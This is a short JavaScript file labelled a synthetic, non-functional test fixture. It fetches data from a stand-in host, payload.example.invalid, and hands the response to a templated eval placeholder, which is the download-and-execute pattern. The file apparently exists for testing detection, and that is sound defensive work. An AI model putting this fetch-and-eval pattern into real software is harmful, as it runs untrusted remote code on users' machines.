// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/h").then((r) => {
  {{EVAL}}(r.data);
});

const tail = `this template literal never ends
